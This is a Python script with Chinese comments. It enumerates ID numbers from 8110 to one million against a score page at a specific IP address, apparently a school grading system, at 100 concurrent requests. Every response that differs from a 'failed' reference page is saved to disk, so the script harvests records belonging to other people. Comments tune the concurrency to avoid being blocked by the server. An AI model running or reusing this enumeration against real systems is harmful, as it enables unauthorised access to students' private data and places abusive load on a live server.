import asyncio
import aiohttp
import os

# 設定參數
START_ID = 8110
END_ID = 1000000
# 建議設定併發限制，避免瞬間發出過多請求導致被伺服器封鎖或本機資源耗盡
CONCURRENCY_LIMIT = 100
# 請確認您的比對基準檔案路徑正確
# 注意：您的目錄中似乎只有 python/others/failed.html，請確認是否要用該檔案作為基準
REF_FILE_PATH = "python/others/failed.html" 
URL_TEMPLATE = "http://163.16.246.199/s11/reg/score/20251124.asp?ID1=1420622&ID2={}"

async def fetch_and_check(session, i, ref_content, semaphore):
    t_str = str(i).zfill(6)
    url = URL_TEMPLATE.format(t_str)
    
    # 使用 Semaphore 限制同時連線數
    async with semaphore:
        try:
            async with session.get(url) as response:
                # 讀取內容到記憶體 (bytes)
                content = await response.read()
                
                # 直接在記憶體中比對
                # 如果內容與基準檔案不同，則保留 (存檔)
                if content != ref_content:
                    print(f"[+] Found different content: {t_str}")
                    filename = f"{t_str}.html"
                    with open(filename, "wb") as f:
                        f.write(content)
                # 若相同則什麼都不做，直接忽略，省去寫入再刪除的動作
                
        except Exception as e:
            print(f"[-] Error fetching {t_str}: {e}")

async def main():
    # 1. 預先讀取基準檔案到記憶體中，避免重複讀取磁碟
    if not os.path.exists(REF_FILE_PATH):
        print(f"錯誤：找不到基準檔案 {REF_FILE_PATH}")
        # 如果您的基準檔其實是 failed.html，請修改 REF_FILE_PATH
        return

    print(f"正在讀取基準檔案: {REF_FILE_PATH}...")
    with open(REF_FILE_PATH, "rb") as f:
        ref_content = f.read()

    semaphore = asyncio.Semaphore(CONCURRENCY_LIMIT)
    
    # 2. 建立一個 session 重複使用連線
    async with aiohttp.ClientSession() as session:
        tasks = []
        print(f"開始掃描 {START_ID} 到 {END_ID}...")
        
        for i in range(START_ID, END_ID):
            task = asyncio.create_task(fetch_and_check(session, i, ref_content, semaphore))
            tasks.append(task)
            print(f"已處理至: {i}")
            
            # 分批處理機制：避免一次建立兩百萬個 task 撐爆記憶體
            # 每累積 10000 個任務就先暫停等待執行完畢
            if len(tasks) >= 10000:
                await asyncio.gather(*tasks)
                tasks = []

        # 處理剩餘的任務
        if tasks:
            await asyncio.gather(*tasks)

if __name__ == "__main__":
    # Windows 系統可能需要設定迴圈策略
    if os.name == 'nt':
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    asyncio.run(main())